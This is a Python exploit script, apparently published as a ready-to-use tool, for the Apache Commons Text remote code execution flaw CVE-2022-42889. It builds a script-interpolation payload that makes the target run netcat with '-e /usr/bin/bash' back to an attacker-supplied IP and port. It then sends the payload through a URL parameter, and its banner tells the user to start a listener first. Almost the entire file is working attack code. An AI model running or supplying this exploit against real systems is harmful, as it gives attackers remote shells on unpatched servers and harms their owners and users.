#!/usr/bin/env python3
# coding=utf-8
# EXPLOIT AUTHOR
# Vicky Aryan (@pwnb0y)
# Apache Commons Text Vulnerability [CVE-2022-42889] 
# Affects Commons Text versions 1.5 through 1.9
# this exploit will work only if the target has netcat installed on their system.

from termcolor import cprint
import sys
import argparse
def banner():
 import pyfiglet as pf
 figlet1=pf.figlet_format("T3XT4SH3LL")
 cprint(figlet1,'red')
 cprint(' developed by @pwnb0y','yellow')
 print('-'*50)
 cprint('[•] CVE-2022-42889 - Apache Commons Text RCE Exploit', "green")
 cprint("[•] Note: At first start a lister at your local machine to receive connection eg: nc -lvnp 4444",'blue')
banner()
if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)
parser=argparse.ArgumentParser(description="Apache Commons Text RCE Exploit")
parser.add_argument('-u','--url',help="Enter URL with parameter like: https://example.com/page?param=",required=True)
parser.add_argument('-i','--ip',help="Local IP address", required=True)
parser.add_argument('-p','--port',help="Local Port default port is 4444",default=4444)
parser.add_argument('-t','--type',help="Shell type default type is sh",default='sh')
args=parser.parse_args()
cmd=f'/usr/bin/nc  {args.ip} {args.port} -e /usr/bin/bash'
payload="${script:javascript:java.lang.Runtime.getRuntime().exec("+cmd+")}"
url=args.url+payload
def exploit():
   import urllib3
   try:
    http = urllib3.PoolManager()
    http.request('GET',url)
   except TimeoutError as e:
    print(e)
if __name__ == "__main__":
    try:
        exploit()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)

